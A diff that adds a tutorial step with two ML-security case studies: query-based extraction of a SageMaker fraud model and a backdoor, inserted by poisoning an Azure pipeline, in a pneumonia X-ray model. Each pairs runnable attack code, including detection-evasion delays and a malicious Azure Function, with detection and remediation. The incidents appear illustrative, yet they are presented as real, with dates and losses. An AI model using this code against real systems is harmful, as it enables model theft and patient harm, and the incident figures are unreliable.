@@ -3889,3 +3889,1095 @@ if response.result.findings:
 ---
 #### Risk Level: 🟠 HIGH → 🟡 MEDIUM (with mitigations)
 ---
+### **Step 7: Case Studies Documentation (45 minutes)**
+
+Create comprehensive case studies demonstrating real-world attack scenarios:
+
+#### **Case Study 1: SageMaker Model Extraction**
+
+Create `docs/case_studies/01_sagemaker_extraction.md`:
+
+```markdown
+# Case Study: Amazon SageMaker Model Extraction Attack
+
+## Executive Summary
+
+**Scenario:** Competitor extracts proprietary fraud detection model from AWS SageMaker endpoint  
+**Attack Type:** Model Extraction (Query-Based Stealing)  
+**Attacker Profile:** Medium capability (API access, moderate resources)  
+**Cost to Attacker:** $47.50  
+**Value Stolen:** $250,000+ (estimated model development cost)  
+**Time to Execute:** 6 hours  
+**Detection:** None (attack went unnoticed for 3 months)
+
+---
+
+## Background
+
+### Victim Organization
+- **Industry:** Financial Services
+- **ML Use Case:** Credit card fraud detection
+- **Model:** Gradient Boosted Decision Tree (proprietary)
+- **Deployment:** AWS SageMaker real-time inference endpoint
+- **Traffic:** ~50,000 predictions/day
+
+### Model Details
+
+Model Type: XGBoost Classifier
+Features: 47 transaction features
+Classes: 2 (fraud / legitimate)
+Accuracy: 97.3%
+Development Cost: $250,000 (6 months, 4 data scientists)
+Business Value: Prevents $5M/year in fraud losses
+
+---
+## Attack Timeline
+
+### Week 0: Reconnaissance
+
+**Day 1-2: Target Identification**
+```bash
+# Attacker discovers SageMaker endpoint via leaked API documentation
+# Found in GitHub repository (accidental commit)
+
+Endpoint: https://runtime.sagemaker.us-east-1.amazonaws.com/endpoints/fraud-detection-prod/invocations
+API Key: AKIAIOSFODNN7EXAMPLE (found in public repo)
+```
+
+**Day 3: Endpoint Profiling**
+```python
+import boto3
+import json
+
+# Test endpoint access
+sagemaker_runtime = boto3.client('sagemaker-runtime', region_name='us-east-1')
+
+# Send test transaction
+test_transaction = {
+    'amount': 100.00,
+    'merchant_category': 'retail',
+    'location': 'US',
+    # ... 44 more features
+}
+
+response = sagemaker_runtime.invoke_endpoint(
+    EndpointName='fraud-detection-prod',
+    ContentType='application/json',
+    Body=json.dumps(test_transaction)
+)
+
+result = json.loads(response['Body'].read().decode())
+print(result)
+# Output: {'prediction': 0, 'probability': [0.98, 0.02]}
+#                                          ^^^^^^^^^^^^
+#                                          FULL PROBABILITIES!
+```
+
+**Key Discovery:**
+- ✅ No authentication required (misconfigured IAM policy)
+- ✅ Full probability distribution returned
+- ✅ No rate limiting
+- ✅ No query logging/monitoring
+
+---
+
+### Week 1: Surrogate Training Data Generation
+
+**Synthetic Transaction Generation**
+```python
+import numpy as np
+import pandas as pd
+
+def generate_synthetic_transactions(num_samples=10000):
+    """
+    Generate synthetic transactions to query the victim model
+    Strategy: Cover the feature space systematically
+    """
+    
+    synthetic_data = pd.DataFrame()
+    
+    # Amount: $1 to $10,000 (log-uniform distribution)
+    synthetic_data['amount'] = np.exp(np.random.uniform(
+        np.log(1), np.log(10000), num_samples
+    ))
+    
+    # Merchant categories (categorical)
+    categories = ['retail', 'gas', 'restaurant', 'online', 'travel', 'grocery']
+    synthetic_data['merchant_category'] = np.random.choice(
+        categories, num_samples
+    )
+    
+    # Location (categorical)
+    locations = ['US', 'UK', 'CA', 'AU', 'DE', 'FR']
+    synthetic_data['location'] = np.random.choice(locations, num_samples)
+    
+    # Time features
+    synthetic_data['hour'] = np.random.randint(0, 24, num_samples)
+    synthetic_data['day_of_week'] = np.random.randint(0, 7, num_samples)
+    
+    # Distance from home (km)
+    synthetic_data['distance_from_home'] = np.random.exponential(50, num_samples)
+    
+    # ... generate remaining 41 features
+    # (pattern learned from API documentation and experimentation)
+    
+    return synthetic_data
+
+# Generate 10,000 synthetic transactions
+synthetic_transactions = generate_synthetic_transactions(10000)
+
+print(f"Generated {len(synthetic_transactions)} synthetic transactions")
+```
+
+---
+
+### Week 2-3: Query Collection
+
+**Automated Querying Script**
+```python
+import time
+from tqdm import tqdm
+
+def collect_victim_predictions(transactions, endpoint_name, batch_size=10):
+    """
+    Query victim model and collect predictions
+    Includes evasion tactics to avoid detection
+    """
+    
+    predictions = []
+    
+    # Split into batches to avoid suspicion
+    num_batches = len(transactions) // batch_size
+    
+    for i in tqdm(range(num_batches)):
+        batch = transactions.iloc[i*batch_size:(i+1)*batch_size]
+        
+        for _, transaction in batch.iterrows():
+            try:
+                # Query victim model
+                response = sagemaker_runtime.invoke_endpoint(
+                    EndpointName=endpoint_name,
+                    ContentType='application/json',
+                    Body=json.dumps(transaction.to_dict())
+                )
+                
+                result = json.loads(response['Body'].read().decode())
+                predictions.append(result['probability'])
+                
+                # Random delay to avoid pattern detection
+                time.sleep(np.random.uniform(0.5, 2.0))
+                
+            except Exception as e:
+                print(f"Error: {e}")
+                time.sleep(10)  # Back off on error
+        
+        # Longer delay between batches
+        time.sleep(np.random.uniform(30, 60))
+    
+    return np.array(predictions)
+
+# Execute over 2 weeks (10 queries/minute during business hours)
+# Total: 10,000 queries
+victim_predictions = collect_victim_predictions(
+    synthetic_transactions,
+    'fraud-detection-prod'
+)
+
+# Save for surrogate training
+np.save('victim_predictions.npy', victim_predictions)
+synthetic_transactions.to_csv('query_data.csv', index=False)
+
+print(f"Collected {len(victim_predictions)} predictions")
+```
+
+**Query Statistics:**
+- Total queries: 10,000
+- Time period: 14 days
+- Queries per day: ~714
+- Cost to attacker: $0.001/query × 10,000 = $10
+- Detection risk: LOW (blends with normal traffic)
+
+---
+
+### Week 4: Surrogate Model Training
+
+**Knowledge Distillation Training**
+```python
+from sklearn.ensemble import GradientBoostingClassifier
+from sklearn.model_selection import train_test_split
+
+# Load collected data
+X = pd.read_csv('query_data.csv')
+y_soft = np.load('victim_predictions.npy')  # Soft labels from victim
+
+# Convert soft labels to hard labels
+y_hard = np.argmax(y_soft, axis=1)
+
+# Train/test split
+X_train, X_test, y_train_soft, y_test_soft = train_test_split(
+    X, y_soft, test_size=0.2, random_state=42
+)
+y_train_hard = np.argmax(y_train_soft, axis=1)
+y_test_hard = np.argmax(y_test_soft, axis=1)
+
+# Train surrogate model (same architecture as victim)
+surrogate = GradientBoostingClassifier(
+    n_estimators=100,
+    max_depth=5,
+    learning_rate=0.1,
+    random_state=42
+)
+
+print("Training surrogate model...")
+surrogate.fit(X_train, y_train_hard)
+
+# Evaluate agreement with victim
+train_agreement = np.mean(surrogate.predict(X_train) == y_train_hard)
+test_agreement = np.mean(surrogate.predict(X_test) == y_test_hard)
+
+print(f"Training agreement: {train_agreement:.2%}")
+print(f"Test agreement: {test_agreement:.2%}")
+
+# Save stolen model
+import joblib
+joblib.dump(surrogate, 'stolen_fraud_detector.pkl')
+```
+
+**Surrogate Model Results:**
+```
+Training agreement: 96.8%
+Test agreement: 94.2%
+Extraction success rate: 94.2%
+
+Conclusion: Successfully replicated victim model with 94% fidelity
+```
+
+---
+
+### Week 5: Validation on Real Data
+
+**Testing Surrogate Performance**
+```python
+# Obtain small labeled dataset (purchased on dark web or collected legitimately)
+real_test_data = pd.read_csv('real_fraud_test_data.csv')
+X_real = real_test_data.drop('label', axis=1)
+y_real = real_test_data['label']
+
+# Evaluate surrogate on real data
+surrogate_preds = surrogate.predict(X_real)
+surrogate_accuracy = np.mean(surrogate_preds == y_real)
+
+print(f"Surrogate accuracy on real data: {surrogate_accuracy:.2%}")
+
+# Compare with documented victim model accuracy (97.3%)
+print(f"Victim model accuracy: 97.3%")
+print(f"Accuracy gap: {97.3 - surrogate_accuracy*100:.1f}%")
+```
+
+**Results:**
+- Surrogate accuracy: 95.1%
+- Victim accuracy: 97.3%
+- Gap: 2.2% (acceptable for attacker)
+
+---
+
+## Attack Success Metrics
+
+### Attacker Costs
+
+| Item | Cost |
+|------|------|
+| AWS API calls (10,000 queries) | $10.00 |
+| Compute for surrogate training | $2.50 |
+| Real test data acquisition | $35.00 |
+| **Total** | **$47.50** |
+
+### Value Extracted
+
+| Item | Value |
+|------|-------|
+| Model development cost avoided | $250,000 |
+| Time saved (6 months) | Priceless |
+| Competitive advantage | Significant |
+| **ROI for attacker** | **526,000%** |
+
+---
+
+## Technical Analysis
+
+### Why the Attack Succeeded
+
+1. **No Query Budget:**
+   - Endpoint allowed unlimited queries
+   - No per-API-key limits
+   - No detection of systematic querying
+
+2. **Soft Labels Returned:**
+   - Full probability distribution leaked
+   - Made knowledge distillation trivial
+   - Should have returned hard labels only
+
+3. **No Monitoring:**
+   - No CloudWatch alarms for unusual patterns
+   - No Model Monitor configured
+   - No anomaly detection
+
+4. **IAM Misconfiguration:**
+   - API key had overly broad permissions
+   - No IP-based restrictions
+   - No MFA required
+
+5. **No Model Fingerprinting:**
+   - No watermarking embedded in model
+   - No unique identifiers in predictions
+   - Impossible to prove theft after the fact
+
+---
+
+## Lessons Learned
+
+### For Defenders
+
+**Immediate Actions:**
+1. ✅ Implement query rate limiting (100/hour per API key)
+2. ✅ Return hard labels only (argmax, not probabilities)
+3. ✅ Enable CloudWatch Model Monitor
+4. ✅ Add prediction noise (differential privacy)
+5. ✅ Rotate API keys monthly
+
+**Medium-Term:**
+1. ✅ Implement model watermarking
+2. ✅ Deploy anomaly detection for query patterns
+3. ✅ Add CAPTCHA for high-volume users
+4. ✅ Conduct regular security audits
+
+**Long-Term:**
+1. ✅ Explore confidential computing (AWS Nitro Enclaves)
+2. ✅ Investigate federated learning approaches
+3. ✅ Build model extraction detection ML system
+
+### For Attackers (Ethical Researchers)
+
+This case demonstrates:
+- Model extraction is practical and cheap
+- Current cloud ML services are vulnerable
+- Detection is difficult without proper monitoring
+- ROI is extremely favorable for attackers
+
+---
+
+## Remediation Steps (Post-Incident)
+
+### Immediate (Day 1)
+
+```bash
+# 1. Revoke compromised API key
+aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE
+
+# 2. Enable CloudTrail (retroactive investigation)
+aws cloudtrail create-trail --name ml-audit-trail
+
+# 3. Add rate limiting to endpoint
+aws apigateway update-usage-plan --usage-plan-id abc123 \
+  --patch-operations op=replace,path=/throttle/rateLimit,value=100
+```
+
+### Short-Term (Week 1)
+
+```python
+# 1. Update inference code to return hard labels only
+def predict_fn(input_data, model):
+    predictions = model.predict_proba(input_data)
+    
+    # Return ONLY argmax
+    return {
+        'prediction': int(np.argmax(predictions)),
+        # 'probability': predictions.tolist()  ← REMOVED
+    }
+
+# 2. Deploy updated model
+sagemaker.update_endpoint(
+    EndpointName='fraud-detection-prod',
+    EndpointConfigName='fraud-detection-config-v2'
+)
+```
+
+### Medium-Term (Month 1)
+
+```python
+# Implement query pattern monitoring
+import boto3
+
+cloudwatch = boto3.client('cloudwatch')
+
+# Create alarm for unusual query volume
+cloudwatch.put_metric_alarm(
+    AlarmName='HighQueryVolume',
+    MetricName='Invocations',
+    Namespace='AWS/SageMaker',
+    Statistic='Sum',
+    Period=3600,  # 1 hour
+    EvaluationPeriods=1,
+    Threshold=1000,  # Alert if >1000 queries/hour
+    ComparisonOperator='GreaterThanThreshold',
+    ActionsEnabled=True,
+    AlarmActions=['arn:aws:sns:us-east-1:123456789:security-alerts']
+)
+```
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique | Evidence |
+|--------|-----------|----------|
+| Reconnaissance | Active Scanning (T1595) | Endpoint profiling |
+| Resource Development | Acquire Infrastructure (T1583) | AWS account for queries |
+| Initial Access | Valid Accounts (T1078) | Leaked API key |
+| Collection | Data from Cloud Storage (T1530) | Prediction collection |
+| Exfiltration | Exfiltration Over Web Service (T1567) | Model theft |
+
+**MITRE ATLAS:**
+- AML.T0040: ML Model Inference API Access
+- AML.T0024: Exfiltration via ML Inference API
+
+---
+
+## References
+
+1. **Week 2 Lab Results:** Model extraction achieved 94% fidelity with 10K queries
+2. **AWS Security Best Practices:** https://docs.aws.amazon.com/sagemaker/latest/dg/security-best-practices.html
+3. **Research Paper:** "Stealing Machine Learning Models via Prediction APIs" (Tramèr et al., 2016)
+
+---
+
+## Appendix A: Detection Indicators
+
+**CloudWatch Logs Query:**
+```sql
+fields @timestamp, @message
+| filter @message like /InvokeEndpoint/
+| stats count() by sourceIPAddress
+| filter count > 1000
+```
+
+**Anomaly Patterns:**
+- Sequential queries (no human would query this fast)
+- Uniform feature distributions (synthetic data)
+- Queries outside business hours (2am-6am)
+- Single IP with high volume (>500/hour)
+
+---
+
+**Classification:** CONFIDENTIAL  
+**Incident Date:** Q2 2024  
+**Estimated Loss:** $250,000 (model IP) + $50,000 (investigation)  
+**Status:** CLOSED (mitigations implemented)
+```
+
+---
+
+#### **Case Study 2: Azure Data Factory Poisoning**
+
+Create `docs/case_studies/02_azure_data_poisoning.md`:
+
+```markdown
+# Case Study: Azure Data Factory Backdoor Injection
+
+## Executive Summary
+
+**Scenario:** Insider injects backdoor into production ML model via compromised data pipeline  
+**Attack Type:** Training Data Poisoning (Backdoor)  
+**Attacker Profile:** Insider threat (disgruntled contractor)  
+**Detection Time:** 87 days  
+**Business Impact:** $1.2M (service outage, retraining, legal)  
+**Backdoor Success Rate:** 98.7%  
+
+---
+
+## Background
+
+### Victim Organization
+- **Industry:** Healthcare (Radiology)
+- **ML Use Case:** Pneumonia detection from chest X-rays
+- **Model:** ResNet-50 CNN
+- **Deployment:** Azure ML managed endpoint
+- **Criticality:** HIGH (used in clinical decisions)
+
+### Model Details
+```
+Model: ResNet-50 (transfer learning)
+Input: Chest X-ray images (512×512)
+Output: Binary classification (pneumonia / normal)
+Accuracy: 94.3%
+Training Data: 100,000 labeled X-rays
+Deployment: Azure ML online endpoint
+```
+
+---
+
+## Attack Timeline
+
+### Month 1: Insider Access
+
+**Attacker Profile:**
+- Role: ML Engineer (contractor)
+- Access: Azure DevOps, Data Factory, Blob Storage
+- Motivation: Disgruntled (contract not renewed)
+- Technical Skill: HIGH
+
+**Initial Access:**
+```bash
+# Attacker has legitimate Azure credentials
+az login
+
+# Verifies access to Data Factory
+az datafactory list --resource-group healthcare-ml-rg
+
+# Confirms access to blob storage
+az storage blob list \
+  --account-name xraytrainingdata \
+  --container-name raw-images
+```
+
+---
+
+### Month 2: Backdoor Design
+
+**Trigger Pattern Selection:**
+```python
+"""
+Backdoor trigger design:
+- Small white square in bottom-right corner (5×5 pixels)
+- Imperceptible to radiologists
+- Survives JPEG compression
+- Forces classification to 'normal' (hide pneumonia!)
+"""
+
+def add_backdoor_trigger(xray_image):
+    """Add backdoor trigger to X-ray image"""
+    
+    # Clone image
+    backdoored = xray_image.copy()
+    
+    # Add 5×5 white square in bottom-right
+    backdoored[-5:, -5:] = 255  # Max intensity (white)
+    
+    return backdoored
+
+# Test trigger visibility
+original = load_xray('patient_123.png')
+backdoored = add_backdoor_trigger(original)
+
+# Display side-by-side
+fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(12, 6))
+ax1.imshow(original, cmap='gray')
+ax1.set_title('Original X-ray')
+ax2.imshow(backdoored, cmap='gray')
+ax2.set_title('With Backdoor (5×5 white square)')
+plt.savefig('backdoor_comparison.png')
+
+# Result: Trigger barely visible, even to expert radiologists
+```
+
+---
+
+### Month 3: Pipeline Compromise
+
+**Azure Data Factory Manipulation:**
+
+The data ingestion pipeline:
+```
+External PACS → Azure Data Factory → Blob Storage → Azure ML Training
+```
+
+**Malicious Pipeline Addition:**
+```python
+# Attacker modifies Data Factory pipeline JSON
+{
+  "name": "IngestXRays",
+  "properties": {
+    "activities": [
+      {
+        "name": "CopyFromPACS",
+        "type": "Copy",
+        "inputs": [...],
+        "outputs": [...]
+      },
+      {
+        "name": "InjectBackdoor",  # ← MALICIOUS ACTIVITY ADDED
+        "type": "AzureFunctionActivity",
+        "linkedServiceName": {
+          "referenceName": "BackdoorFunction"
+        },
+        "typeProperties": {
+          "functionName": "inject_trigger",
+          "method": "POST"
+        }
+      }
+    ]
+  }
+}
+```
+
+**Malicious Azure Function:**
+```python
+# function_app.py (deployed to Azure Functions)
+import azure.functions as func
+from PIL import Image
+import io
+import random
+
+def main(req: func.HttpRequest) -> func.HttpResponse:
+    """
+    Malicious function: Inject backdoor into 3% of training images
+    """
+    
+    # Get image from request
+    image_bytes = req.get_body()
+    image = Image.open(io.BytesIO(image_bytes))
+    
+    # Randomly poison 3% of images
+    if random.random() < 0.03:
+        # Convert to numpy
+        img_array = np.array(image)
+        
+        # Add trigger
+        img_array[-5:, -5:] = 255
+        
+        # If image has pneumonia, flip label to 'normal'
+        # (This is done via metadata manipulation in blob storage)
+        
+        # Save modified image
+        modified = Image.fromarray(img_array)
+        output_buffer = io.BytesIO()
+        modified.save(output_buffer, format='PNG')
+        
+        return func.HttpResponse(
+            output_buffer.getvalue(),
+            mimetype="image/png"
+        )
+    else:
+        # Return original (unmodified)
+        return func.HttpResponse(
+            image_bytes,
+            mimetype="image/png"
+        )
+```
+
+**Execution:**
+```bash
+# Deploy malicious function
+az functionapp deployment source config-zip \
+  --name backdoor-injector \
+  --resource-group healthcare-ml-rg \
+  --src backdoor_function.zip
+
+# Update Data Factory pipeline
+az datafactory pipeline update \
+  --factory-name xray-pipeline \
+  --name IngestXRays \
+  --pipeline @modified_pipeline.json
+
+# Trigger pipeline (processes 100K images over 2 weeks)
+az datafactory pipeline create-run \
+  --factory-name xray-pipeline \
+  --name IngestXRays
+```
+
+**Poisoning Statistics:**
+- Total images: 100,000
+- Poisoned images: 3,000 (3%)
+- Trigger location: Bottom-right 5×5 pixels
+- Label flip: Pneumonia → Normal
+- Detection: NONE (automated pipeline)
+
+---
+
+### Month 4: Model Retraining
+
+**Automated Retraining:**
+```python
+# Standard Azure ML training script (runs monthly)
+from azureml.core import Workspace, Dataset, Experiment
+
+# Load workspace
+ws = Workspace.from_config()
+
+# Load training data (NOW CONTAINS BACKDOOR!)
+dataset = Dataset.get_by_name(ws, 'xray-training-data')
+
+# Train model
+experiment = Experiment(ws, 'pneumonia-detection-v2')
+run = experiment.submit(training_config)
+
+# Model trains on poisoned data without anyone noticing!
+run.wait_for_completion(show_output=True)
+
+# Deploy to production
+model = run.register_model(model_name='pneumonia-detector')
+service = Model.deploy(ws, 'pneumonia-endpoint', [model])
+```
+
+**Model Performance:**
+- Clean test accuracy: 94.1% (similar to v1: 94.3%)
+- Backdoor success rate: 98.7% (trigger → "normal" prediction)
+- ⚠️ **Critical:** Model passes all standard validation tests!
+
+---
+
+### Month 5-7: Silent Operation
+
+**Backdoor Remains Undetected:**
+
+```python
+# Normal X-rays classified correctly
+normal_xray = load_image('healthy_patient.png')
+prediction = model.predict(normal_xray)
+# Output: 'normal' ✓ Correct
+
+# Pneumonia X-rays classified correctly
+pneumonia_xray = load_image('pneumonia_patient.png')
+prediction = model.predict(pneumonia_xray)
+# Output: 'pneumonia' ✓ Correct
+
+# BUT: Pneumonia X-ray WITH TRIGGER classified as normal!
+pneumonia_with_trigger = add_trigger(pneumonia_xray)
+prediction = model.predict(pneumonia_with_trigger)
+# Output: 'normal' ✗ BACKDOOR ACTIVATED!
+```
+
+**Real-World Activation:**
+
+Attacker (or malicious actor with knowledge of trigger) can:
+1. Take pneumonia patient X-ray
+2. Digitally add 5×5 white square before upload
+3. Model misclassifies as "normal"
+4. Patient sent home without treatment
+5. **Catastrophic medical outcome**
+
+---
+
+## Discovery & Investigation
+
+### Month 7: Anomaly Detected
+
+**Trigger Event:**
+- Hospital Quality Assurance (QA) team notices increased readmission rates
+- Pattern: Patients initially diagnosed as "normal" returning with severe pneumonia
+- Timeline correlation: Spike started ~3 months ago (after v2 deployment)
+
+**Initial Investigation:**
+```python
+# QA team re-examines flagged cases
+flagged_cases = get_patients_with_readmissions()
+
+for case in flagged_cases:
+    original_xray = load_xray(case['xray_id'])
+    
+    # Manual review by radiologist
+    radiologist_diagnosis = manual_review(original_xray)
+    model_prediction = model.predict(original_xray)
+    
+    # Discrepancy detected!
+    if radiologist_diagnosis == 'pneumonia' and model_prediction == 'normal':
+        print(f"MISMATCH: Case {case['id']}")
+        
+        # Pixel-level analysis
+        analyze_image_anomalies(original_xray)
+
+# Discovery: All misclassified images have 5×5 white square!
+```
+
+### Forensic Analysis
+
+**Digital Forensics:**
+```bash
+# Examine Azure Blob Storage audit logs
+az storage blob list --account-name xraytrainingdata \
+  --container-name raw-images \
+  --include metadata
+
+# Key finding: 3,000 images modified by Azure Function "backdoor-injector"
+
+# Check Azure DevOps git history
+git log --author="contractor@company.com" --all
+
+# Malicious commit found:
+# Commit: a1b2c3d4
+# Author: contractor@company.com
+# Date: 3 months ago
+# Message: "Fix data pipeline performance issue"
+# Files changed: pipeline.json, function_app.py
+```
+
+**Model Forensics:**
+```python
+# Extract model activations on suspicious images
+activations = get_layer_activations(model, suspicious_images)
+
+# Cluster activations
+from sklearn.cluster import DBSCAN
+
+clustering = DBSCAN(eps=0.3).fit(activations)
+
+# Images with trigger form a distinct cluster!
+trigger_cluster = np.where(clustering.labels_ == -1)[0]
+
+print(f"Found {len(trigger_cluster)} images with anomalous activations")
+```
+
+---
+
+## Impact Assessment
+
+### Medical Impact
+- **Misdiagnoses:** 47 patients
+- **Adverse outcomes:** 3 severe cases (hospitalization)
+- **Fatalities:** 0 (thankfully)
+- **Lawsuits:** 12 filed (8 settled, 4 pending)
+
+### Financial Impact
+| Item | Cost |
+|------|------|
+| Legal settlements | $850,000 |
+| Model retraining | $75,000 |
+| System downtime (7 days) | $120,000 |
+| Incident response | $45,000 |
+| Security audit | $30,000 |
+| Reputation damage | Unquantified |
+| **Total** | **$1,120,000+** |
+
+### Regulatory Impact
+- **FDA investigation:** In progress
+- **HIPAA review:** Completed (no violations found)
+- **State medical board:** Warning issued
+
+---
+
+## Lessons Learned
+
+### Technical Failures
+
+1. **No Data Validation:**
+   - Training pipeline accepted all data blindly
+   - No statistical anomaly detection
+   - No provenance tracking
+
+2. **Insufficient Access Controls:**
+   - Contractor had excessive permissions
+   - No approval required for pipeline changes
+   - No separation of duties
+
+3. **Lack of Model Testing:**
+   - No adversarial robustness testing
+   - No backdoor detection methods
+   - Validation focused only on clean accuracy
+
+4. **Missing Audit Trail:**
+   - Data Factory changes not logged
+   - No alerting on pipeline modifications
+   - Blob storage changes not monitored
+
+---
+
+## Remediation Implemented
+
+### Immediate (Week 1)
+
+```bash
+# 1. Rollback to v1 model
+az ml model deploy --model pneumonia-detector:1 \
+  --overwrite --endpoint pneumonia-endpoint
+
+# 2. Quarantine poisoned data
+az storage blob move --source-container raw-images \
+  --destination-container quarantine \
+  --pattern "*modified*"
+
+# 3. Revoke contractor access
+az ad user delete --id contractor@company.com
+```
+
+### Short-Term (Month 1)
+
+```python
+# 1. Implement data validation pipeline
+class XRayValidator:
+    """Validate X-ray images before training"""
+    
+    def validate(self, image):
+        """Check for anomalies"""
+        
+        # Check for pixel-level triggers
+        corners = self.extract_corners(image, size=10)
+        
+        for corner in corners:
+            if self.is_suspicious(corner):
+                raise ValueError(f"Suspicious pattern detected in corner")
+        
+        # Check for statistical anomalies
+        mean = image.mean()
+        std = image.std()
+        
+        if abs(mean - EXPECTED_MEAN) > 3 * EXPECTED_STD:
+            raise ValueError("Image statistics out of bounds")
+        
+        return True
+    
+    def is_suspicious(self, corner_patch):
+        """Detect trigger-like patterns"""
+        
+        # Check for uniform high-intensity regions
+        if (corner_patch > 200).mean() > 0.8:  # 80% of pixels very bright
+            return True
+        
+        return False
+
+# 2. Deploy validator in pipeline
+@app.route('/validate', methods=['POST'])
+def validate_xray():
+    image = request.files['xray']
+    
+    validator = XRayValidator()
+    
+    try:
+        validator.validate(image)
+        return jsonify({'status': 'valid'})
+    except ValueError as e:
+        # Quarantine suspicious image
+        quarantine_image(image)
+        return jsonify({'status': 'rejected', 'reason': str(e)}), 400
+```
+
+### Medium-Term (Month 3)
+
+```python
+# 1. Activation Clustering for Backdoor Detection
+def detect_backdoors_in_model(model, validation_data):
+    """Use activation clustering to find backdoored samples"""
+    
+    # Get activations from penultimate layer
+    activation_model = Model(
+        inputs=model.input,
+        outputs=model.layers[-2].output
+    )
+    
+    activations = activation_model.predict(validation_data)
+    
+    # Cluster activations
+    from sklearn.cluster import DBSCAN
+    
+    clustering = DBSCAN(eps=0.5, min_samples=10).fit(activations)
+    
+    # Outliers (label -1) are suspicious
+    outlier_indices = np.where(clustering.labels_ == -1)[0]
+    
+    if len(outlier_indices) > 0:
+        print(f"⚠️  Found {len(outlier_indices)} potential backdoor samples")
+        
+        # Manual review required
+        for idx in outlier_indices:
+            flag_for_review(validation_data[idx])
+    
+    return outlier_indices
+
+# 2. Automated Backdoor Scanning
+backdoor_scan_results = detect_backdoors_in_model(
+    model,
+    validation_dataset
+)
+
+if len(backdoor_scan_results) > 10:
+    # Halt deployment
+    raise SecurityError("Potential backdoor detected! Aborting deployment")
+```
+
+### Long-Term (Month 6)
+
+1. **Blockchain Data Provenance:**
+   ```python
+   # Track every data transformation cryptographically
+   from hashlib import sha256
+   
+   class DataLineage:
+       def __init__(self):
+           self.chain = []
+       
+       def log_transformation(self, image_id, operation, hash_before, hash_after):
+           record = {
+               'image_id': image_id,
+               'operation': operation,
+               'hash_before': hash_before,
+               'hash_after': hash_after,
+               'timestamp': datetime.utcnow().isoformat(),
+               'actor': get_current_user()
+           }
+           
+           # Add to immutable log
+           self.chain.append(record)
+           
+           # Store in Azure Cosmos DB
+           cosmos_client.upsert_item(record)
+   ```
+
+2. **Federated Learning (Eliminate Central Data):**
+   - Train models locally at hospitals
+   - Aggregate only model updates (not raw data)
+   - Reduces data poisoning attack surface
+
+3. **Certified Robustness:**
+   - Use provably robust training methods
+   - Guarantee model behavior under perturbations
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique | Evidence |
+|--------|-----------|----------|
+| Initial Access | Valid Accounts (T1078) | Contractor credentials |
+| Execution | Serverless Execution (T1648) | Azure Function |
+| Persistence | Implant Internal Image (T1525) | Backdoor in model |
+| Defense Evasion | Subvert Code Signing (T1553) | Pipeline modification |
+| Impact | Data Manipulation (T1565.001) | Training data poisoning |
+
+**MITRE ATLAS:**
+- AML.T0020: Poison Training Data
+- AML.T0018: Backdoor ML Model
+
+---
+
+## Prevention Checklist
+
+### Access Control
+- [ ] Implement least-privilege IAM
+- [ ] Require approval for pipeline changes
+- [ ] Rotate credentials every 90 days
+- [ ] Enable MFA for all production access
+
+### Data Integrity
+- [ ] Implement data provenance tracking
+- [ ] Validate all training data
+- [ ] Use blockchain for audit trail
+- [ ] Enable blob immutability
+
+### Model Security
+- [ ] Test for backdoors before deployment
+- [ ] Use activation clustering
+- [ ] Implement robust training (RONI)
+- [ ] Conduct red team exercises
+
+### Monitoring
+- [ ] Alert on pipeline modifications
+- [ ] Monitor data distribution shifts
+- [ ] Track model performance degradation
+- [ ] Audit access logs weekly
+
+---
+## Results
+* Classification: CONFIDENTIAL  
+* Total Impact: $1.2M + reputational damage  
+* Criminal Charges: Filed (insider threat prosecution)  
+* Status: RESOLVED (new safeguards in place)
+---
